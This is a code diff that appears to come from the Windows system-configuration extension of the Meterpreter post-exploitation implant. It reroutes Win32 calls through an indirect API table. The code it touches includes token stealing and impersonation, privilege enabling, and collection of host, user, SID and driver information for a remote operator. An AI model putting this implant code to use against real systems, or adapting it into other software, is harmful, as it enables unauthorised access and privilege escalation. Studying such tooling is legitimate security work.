@@ -5,8 +5,6 @@
 #include <lm.h>
 #include <psapi.h>
 
-typedef NTSTATUS(WINAPI *PRtlGetVersion)(LPOSVERSIONINFOEXW);
-
 // This may not be defined on some older systems in the header files, so lets define it here manually.
 #ifndef SE_DELEGATE_SESSION_USER_IMPERSONATE_NAME
 #define SE_DELEGATE_SESSION_USER_IMPERSONATE_NAME TEXT("SeDelegateSessionUserImpersonatePrivilege")
@@ -93,7 +91,7 @@ DWORD request_sys_config_getenv(Remote *remote, Packet *packet)
 			// grab the value of the variable and stick it in the response.
 			PWCHAR name = met_api->string.utf8_to_wchar(pEnvVarStart);
 			//Ensure we always have > 0 bytes even if env var doesn't exist
-			DWORD envlen = GetEnvironmentVariableW(name, NULL, 0);
+			DWORD envlen = met_api->win_api.kernel32.GetEnvironmentVariableW(name, NULL, 0);
 			if (envlen == 0)
 
 			{
@@ -102,7 +100,7 @@ DWORD request_sys_config_getenv(Remote *remote, Packet *packet)
 			else 
 			{
 				PWCHAR wvalue = (PWCHAR)malloc(envlen * sizeof(WCHAR));
-				GetEnvironmentVariableW(name, wvalue, envlen);
+				met_api->win_api.kernel32.GetEnvironmentVariableW(name, wvalue, envlen);
 				char* value = met_api->string.wchar_to_utf8(wvalue);
 				add_env_pair(response, pEnvVarStart, value);
 				free(wvalue);
@@ -134,17 +132,17 @@ DWORD get_user_token(LPVOID pTokenUser, DWORD dwBufferSize)
 
 	do
 	{
-		if (!OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, FALSE, &hToken))
+		if (!met_api->win_api.advapi32.OpenThreadToken(met_api->win_api.kernel32.GetCurrentThread(), TOKEN_QUERY, FALSE, &hToken))
 		{
-			if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
+			if (!met_api->win_api.advapi32.OpenProcessToken(met_api->win_api.kernel32.GetCurrentProcess(), TOKEN_QUERY, &hToken))
 			{
-				BREAK_ON_ERROR("[TOKEN] Failed to get a valid token for thread/process.");
+				BREAK_WITH_ERROR("[TOKEN] Failed to get a valid token for thread/process.", met_api->win_api.kernel32.GetLastError());
 			}
 		}
 
-		if (!GetTokenInformation(hToken, TokenUser, pTokenUser, dwBufferSize, &dwReturnedLength))
+		if (!met_api->win_api.advapi32.GetTokenInformation(hToken, TokenUser, pTokenUser, dwBufferSize, &dwReturnedLength))
 		{
-			BREAK_ON_ERROR("[TOKEN] Failed to get token information for thread/process.");
+			BREAK_WITH_ERROR("[TOKEN] Failed to get token information for thread/process.", met_api->win_api.kernel32.GetLastError());
 		}
 
 		dwResult = ERROR_SUCCESS;
@@ -174,9 +172,9 @@ DWORD request_sys_config_getsid(Remote* pRemote, Packet* pRequest)
 			break;
 		}
 
-		if (!ConvertSidToStringSidA(((TOKEN_USER*)tokenUserInfo)->User.Sid, &pSid))
+		if (!met_api->win_api.advapi32.ConvertSidToStringSidA(((TOKEN_USER*)tokenUserInfo)->User.Sid, &pSid))
 		{
-			BREAK_ON_ERROR("[GETSID] Unable to convert current SID to string");
+			BREAK_WITH_ERROR("[GETSID] Unable to convert current SID to string", met_api->win_api.kernel32.GetLastError());
 		}
 
 	} while (0);
@@ -184,7 +182,7 @@ DWORD request_sys_config_getsid(Remote* pRemote, Packet* pRequest)
 	if (pSid != NULL)
 	{
 		met_api->packet.add_tlv_string(pResponse, TLV_TYPE_SID, pSid);
-		LocalFree(pSid);
+		met_api->win_api.kernel32.LocalFree(pSid);
 	}
 
 	met_api->packet.transmit_response(dwResult, pRemote, pResponse);
@@ -221,9 +219,9 @@ DWORD populate_uid(Packet* pResponse)
 			break;
 		}
 
-		if (!LookupAccountSidW(NULL, ((TOKEN_USER*)tokenUserInfo)->User.Sid, cbUserOnly, &dwUserSize, cbDomainOnly, &dwDomainSize, (PSID_NAME_USE)&dwSidType))
+		if (!met_api->win_api.advapi32.LookupAccountSidW(NULL, ((TOKEN_USER*)tokenUserInfo)->User.Sid, cbUserOnly, &dwUserSize, cbDomainOnly, &dwDomainSize, (PSID_NAME_USE)&dwSidType))
 		{
-			BREAK_ON_ERROR("[GETUID] Failed to lookup the account SID data");
+			BREAK_WITH_ERROR("[GETUID] Failed to lookup the account SID data", met_api->win_api.kernel32.GetLastError());
 		}
 
 		char *domainName = met_api->string.wchar_to_utf8(cbDomainOnly);
@@ -297,9 +295,9 @@ DWORD request_sys_config_update_token(Remote* pRemote, Packet* pPacket)
 	hToken = (HANDLE)met_api->packet.get_tlv_value_qword(pPacket, TLV_TYPE_HANDLE);
 
 	// Impersonate token in the current thread
-	if (!ImpersonateLoggedOnUser(hToken))
+	if (!met_api->win_api.advapi32.ImpersonateLoggedOnUser(hToken))
 	{
-		dwResult = GetLastError();
+		dwResult = met_api->win_api.kernel32.GetLastError();
 		dprintf("[UPDATE-TOKEN] Failed to impersonate token (%u)", dwResult);
 		met_api->packet.transmit_response(dwResult, pRemote, pResponse);
 		return dwResult;
@@ -394,9 +392,9 @@ DWORD request_sys_config_getprivs(Remote *remote, Packet *packet)
 
 	do
 	{
-		if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token))
+		if (!met_api->win_api.advapi32.OpenProcessToken(met_api->win_api.kernel32.GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token))
 		{
-			res = GetLastError();
+			res = met_api->win_api.kernel32.GetLastError();
 			dprintf("[GETPRIVS] Failed to open the process token: %u 0x%x", res, res);
 			break;
 		}
@@ -404,12 +402,12 @@ DWORD request_sys_config_getprivs(Remote *remote, Packet *packet)
 		for (x = 0; privs[x]; ++x)
 		{
 			memset(&priv, 0, sizeof(priv));
-			LookupPrivilegeValue(NULL, privs[x], &priv.Privileges[0].Luid);
+			met_api->win_api.advapi32.LookupPrivilegeValueA(NULL, privs[x], &priv.Privileges[0].Luid);
 			priv.PrivilegeCount = 1;
 			priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
-			if (AdjustTokenPrivileges(token, FALSE, &priv, 0, 0, 0))
+			if (met_api->win_api.advapi32.AdjustTokenPrivileges(token, FALSE, &priv, 0, 0, 0))
 			{
-				if (GetLastError() == ERROR_SUCCESS)
+				if (met_api->win_api.kernel32.GetLastError() == ERROR_SUCCESS)
 				{
 					dprintf("[GETPRIVS] Got Priv %s", privs[x]);
 					met_api->packet.add_tlv_string(response, TLV_TYPE_PRIVILEGE, privs[x]);
@@ -417,14 +415,14 @@ DWORD request_sys_config_getprivs(Remote *remote, Packet *packet)
 			}
 			else
 			{
-				dprintf("[GETPRIVS] Failed to set privilege %s (%u)", privs[x], GetLastError());
+				dprintf("[GETPRIVS] Failed to set privilege %s (%u)", privs[x], met_api->win_api.kernel32.GetLastError());
 			}
 		}
 	} while (0);
 
 	if (token)
 	{
-		CloseHandle(token);
+		met_api->win_api.kernel32.CloseHandle(token);
 	}
 
 	// Transmit the response
@@ -460,32 +458,32 @@ DWORD request_sys_config_steal_token(Remote *remote, Packet *packet)
 			break;
 		}
 
-		hProcessHandle = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, dwPid);
+		hProcessHandle = met_api->win_api.kernel32.OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, dwPid);
 
 		if (!hProcessHandle)
 		{
-			dwResult = GetLastError();
+			dwResult = met_api->win_api.kernel32.GetLastError();
 			dprintf("[STEAL-TOKEN] Failed to open process handle for %d (%u)", dwPid, dwResult);
 			break;
 		}
 
-		if (!OpenProcessToken(hProcessHandle, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hToken))
+		if (!met_api->win_api.advapi32.OpenProcessToken(hProcessHandle, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hToken))
 		{
-			dwResult = GetLastError();
+			dwResult = met_api->win_api.kernel32.GetLastError();
 			dprintf("[STEAL-TOKEN] Failed to open process token for %d (%u)", dwPid, dwResult);
 			break;
 		}
 
-		if (!ImpersonateLoggedOnUser(hToken))
+		if (!met_api->win_api.advapi32.ImpersonateLoggedOnUser(hToken))
 		{
-			dwResult = GetLastError();
+			dwResult = met_api->win_api.kernel32.GetLastError();
 			dprintf("[STEAL-TOKEN] Failed to impersonate token for %d (%u)", dwPid, dwResult);
 			break;
 		}
 
-		if (!DuplicateTokenEx(hToken, TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID | TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY, NULL, SecurityIdentification, TokenPrimary, &hDupToken))
+		if (!met_api->win_api.advapi32.DuplicateTokenEx(hToken, TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID | TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY, NULL, SecurityIdentification, TokenPrimary, &hDupToken))
 		{
-			dwResult = GetLastError();
+			dwResult = met_api->win_api.kernel32.GetLastError();
 			dprintf("[STEAL-TOKEN] Failed to duplicate a primary token for %d (%u)", dwPid, dwResult);
 			break;
 		}
@@ -499,12 +497,12 @@ DWORD request_sys_config_steal_token(Remote *remote, Packet *packet)
 
 	if (hProcessHandle)
 	{
-		CloseHandle(hProcessHandle);
+		met_api->win_api.kernel32.CloseHandle(hProcessHandle);
 	}
 
 	if (hToken)
 	{
-		CloseHandle(hToken);
+		met_api->win_api.kernel32.CloseHandle(hToken);
 	}
 	// Transmit the response
 	met_api->packet.transmit_response(dwResult, remote, response);
@@ -519,22 +517,10 @@ DWORD add_windows_os_version(Packet** packet)
 
 	do
 	{
-		HMODULE hNtdll = GetModuleHandleA("ntdll");
-		if (hNtdll == NULL)
-		{
-			BREAK_ON_ERROR("[SYSINFO] Failed to load ntoskrnl");
-		}
-
-		PRtlGetVersion pRtlGetVersion = (PRtlGetVersion)GetProcAddress(hNtdll, "RtlGetVersion");
-		if (pRtlGetVersion == NULL)
-		{
-			BREAK_ON_ERROR("[SYSINFO] Couldn't find RtlGetVersion in ntoskrnl");
-		}
-
 		OSVERSIONINFOEXW v = { 0 };
 		v.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEXW);
 
-		if (0 != pRtlGetVersion(&v))
+		if (0 != met_api->win_api.ntdll.RtlGetVersion(&v))
 		{
 			dwResult = ERROR_INVALID_DLL;
 			dprintf("[SYSINFO] Unable to get OS version with RtlGetVersion");
@@ -723,8 +709,8 @@ DWORD request_sys_config_localtime(Remote* remote, Packet* packet)
 	TIME_ZONE_INFORMATION tzi = { 0 };
 	SYSTEMTIME localTime = { 0 };
 
-	DWORD tziResult = GetTimeZoneInformation(&tzi);
-	GetLocalTime(&localTime);
+	DWORD tziResult = met_api->win_api.kernel32.GetTimeZoneInformation(&tzi);
+	met_api->win_api.kernel32.GetLocalTime(&localTime);
 
 	_snprintf_s(dateTime, sizeof(dateTime), sizeof(dateTime) - 1, "%d-%02d-%02d %02d:%02d:%02d.%d %S (UTC%s%d)",
 		localTime.wYear, localTime.wMonth, localTime.wDay,
@@ -753,7 +739,6 @@ DWORD request_sys_config_sysinfo(Remote *remote, Packet *packet)
 	CHAR computer[512], buf[512], * osArch = NULL;
 	DWORD res = ERROR_SUCCESS;
 	DWORD size = sizeof(computer);
-	HMODULE hKernel32;
 
 	memset(computer, 0, sizeof(computer));
 	memset(buf, 0, sizeof(buf));
@@ -761,41 +746,31 @@ DWORD request_sys_config_sysinfo(Remote *remote, Packet *packet)
 	do
 	{
 		// Get the computer name
-		if (!GetComputerName(computer, &size))
+		if (!met_api->win_api.kernel32.GetComputerNameA(computer, &size))
 		{
-			res = GetLastError();
+			res = met_api->win_api.kernel32.GetLastError();
 			break;
 		}
 
 		met_api->packet.add_tlv_string(response, TLV_TYPE_COMPUTER_NAME, computer);
 		add_windows_os_version(&response);
 
-		// sf: we dynamically retrieve GetNativeSystemInfo & IsWow64Process as NT and 2000 dont support it.
-		hKernel32 = LoadLibraryA("kernel32.dll");
-		if (hKernel32)
 		{
-			typedef void (WINAPI * GETNATIVESYSTEMINFO)(LPSYSTEM_INFO lpSystemInfo);
-			typedef BOOL(WINAPI * ISWOW64PROCESS)(HANDLE, PBOOL);
-			GETNATIVESYSTEMINFO pGetNativeSystemInfo = (GETNATIVESYSTEMINFO)GetProcAddress(hKernel32, "GetNativeSystemInfo");
-			ISWOW64PROCESS pIsWow64Process = (ISWOW64PROCESS)GetProcAddress(hKernel32, "IsWow64Process");
-			if (pGetNativeSystemInfo)
+			SYSTEM_INFO SystemInfo = { 0 };
+			met_api->win_api.kernel32.GetNativeSystemInfo(&SystemInfo);
+			switch (SystemInfo.wProcessorArchitecture)
 			{
-				SYSTEM_INFO SystemInfo;
-				pGetNativeSystemInfo(&SystemInfo);
-				switch (SystemInfo.wProcessorArchitecture)
-				{
-				case PROCESSOR_ARCHITECTURE_AMD64:
-					osArch = "x64";
-					break;
-				case PROCESSOR_ARCHITECTURE_IA64:
-					osArch = "IA64";
-					break;
-				case PROCESSOR_ARCHITECTURE_INTEL:
-					osArch = "x86";
-					break;
-				default:
-					break;
-				}
+			case PROCESSOR_ARCHITECTURE_AMD64:
+				osArch = "x64";
+				break;
+			case PROCESSOR_ARCHITECTURE_IA64:
+				osArch = "IA64";
+				break;
+			case PROCESSOR_ARCHITECTURE_INTEL:
+				osArch = "x86";
+				break;
+			default:
+				break;
 			}
 		}
 		// if we havnt set the arch it is probably because we are on NT/2000 which is x86
@@ -807,27 +782,23 @@ DWORD request_sys_config_sysinfo(Remote *remote, Packet *packet)
 		dprintf("[SYSINFO] Arch set to: %s", osArch);
 		met_api->packet.add_tlv_string(response, TLV_TYPE_ARCHITECTURE, osArch);
 
-		if (hKernel32)
 		{
+			LANGID langId = met_api->win_api.kernel32.GetSystemDefaultLangID();
 			char * ctryname = NULL, *langname = NULL;
-			typedef LANGID(WINAPI * GETSYSTEMDEFAULTLANGID)(VOID);
-			GETSYSTEMDEFAULTLANGID pGetSystemDefaultLangID = (GETSYSTEMDEFAULTLANGID)GetProcAddress(hKernel32, "GetSystemDefaultLangID");
-			if (pGetSystemDefaultLangID)
+			if (langId != 0)
 			{
-				LANGID langId = pGetSystemDefaultLangID();
-
-				int len = GetLocaleInfo(langId, LOCALE_SISO3166CTRYNAME, 0, 0);
+				int len = met_api->win_api.kernel32.GetLocaleInfoA(langId, LOCALE_SISO3166CTRYNAME, 0, 0);
 				if (len > 0)
 				{
 					ctryname = (char *)malloc(len);
-					GetLocaleInfo(langId, LOCALE_SISO3166CTRYNAME, ctryname, len);
+					met_api->win_api.kernel32.GetLocaleInfoA(langId, LOCALE_SISO3166CTRYNAME, ctryname, len);
 				}
 
-				len = GetLocaleInfo(langId, LOCALE_SISO639LANGNAME, 0, 0);
+				len = met_api->win_api.kernel32.GetLocaleInfoA(langId, LOCALE_SISO639LANGNAME, 0, 0);
 				if (len > 0)
 				{
 					langname = (char *)malloc(len);
-					GetLocaleInfo(langId, LOCALE_SISO639LANGNAME, langname, len);
+					met_api->win_api.kernel32.GetLocaleInfoA(langId, LOCALE_SISO639LANGNAME, langname, len);
 				}
 			}
 
@@ -855,13 +826,13 @@ DWORD request_sys_config_sysinfo(Remote *remote, Packet *packet)
 
 		LPWKSTA_INFO_102 localSysinfo = NULL;
 
-		if (NetWkstaGetInfo(NULL, 102, (LPBYTE *)&localSysinfo) == NERR_Success)
+		if (met_api->win_api.netapi32.NetWkstaGetInfo(NULL, 102, (LPBYTE *)&localSysinfo) == NERR_Success)
 		{
 			char *domainName = met_api->string.wchar_to_utf8(localSysinfo->wki102_langroup);
 			met_api->packet.add_tlv_string(response, TLV_TYPE_DOMAIN, (LPCSTR)domainName);
 			met_api->packet.add_tlv_uint(response, TLV_TYPE_LOGGED_ON_USER_COUNT, localSysinfo->wki102_logged_on_users);
 			free(domainName);
-			NetApiBufferFree(localSysinfo);
+			met_api->win_api.netapi32.NetApiBufferFree(localSysinfo);
 		}
 		else
 		{
@@ -899,8 +870,8 @@ DWORD request_sys_config_rev2self(Remote *remote, Packet *packet)
 
 		met_api->desktop.update(remote, -1, NULL, NULL);
 
-		if (!RevertToSelf())
-			dwResult = GetLastError();
+		if (!met_api->win_api.advapi32.RevertToSelf())
+			dwResult = met_api->win_api.kernel32.GetLastError();
 
 	} while(0);
 
@@ -922,7 +893,7 @@ DWORD request_sys_config_driver_list(Remote *remote, Packet *packet)
 	DWORD sizeNeeded = 0;
 
 	// start by getting the size required to store the driver list
-	EnumDeviceDrivers(&ignored, sizeof(ignored), &sizeNeeded);
+	met_api->win_api.psapi.EnumDeviceDrivers(&ignored, sizeof(ignored), &sizeNeeded);
 
 	if (sizeNeeded > 0)
 	{
@@ -931,7 +902,7 @@ DWORD request_sys_config_driver_list(Remote *remote, Packet *packet)
 		LPVOID* driverList = (LPVOID*)malloc(sizeNeeded);
 		if (driverList)
 		{
-			if (EnumDeviceDrivers(driverList, sizeNeeded, &sizeNeeded))
+			if (met_api->win_api.psapi.EnumDeviceDrivers(driverList, sizeNeeded, &sizeNeeded))
 			{
 				wchar_t baseName[MAX_PATH];
 				wchar_t fileName[MAX_PATH];
@@ -942,9 +913,9 @@ DWORD request_sys_config_driver_list(Remote *remote, Packet *packet)
 				{
 					BOOL valid = TRUE;
 
-					if (!GetDeviceDriverBaseNameW(driverList[i], baseName, MAX_PATH))
+					if (!met_api->win_api.psapi.GetDeviceDriverBaseNameW(driverList[i], baseName, MAX_PATH))
 					{
-						dprintf("[CONFIG] %d Driver base name read failed: %u 0x%x", i, GetLastError(), GetLastError());
+						dprintf("[CONFIG] %d Driver base name read failed: %u 0x%x", i, met_api->win_api.kernel32.GetLastError(), met_api->win_api.kernel32.GetLastError());
 						// null terminate the string at the start, indicating that it's invalid
 						baseName[0] = L'\x00';
 					}
@@ -953,9 +924,9 @@ DWORD request_sys_config_driver_list(Remote *remote, Packet *packet)
 						dprintf("[CONFIG] %d Driver basename: %S", i, baseName);
 					}
 
-					if (!GetDeviceDriverFileNameW(driverList[i], fileName, MAX_PATH))
+					if (!met_api->win_api.psapi.GetDeviceDriverFileNameW(driverList[i], fileName, MAX_PATH))
 					{
-						dprintf("[CONFIG] %d Driver file name read failed: %u 0x%x", i, GetLastError(), GetLastError());
+						dprintf("[CONFIG] %d Driver file name read failed: %u 0x%x", i, met_api->win_api.kernel32.GetLastError(), met_api->win_api.kernel32.GetLastError());
 
 						// null terminate the string at the start, indicating that it's invalid
 						fileName[0] = L'\x00';
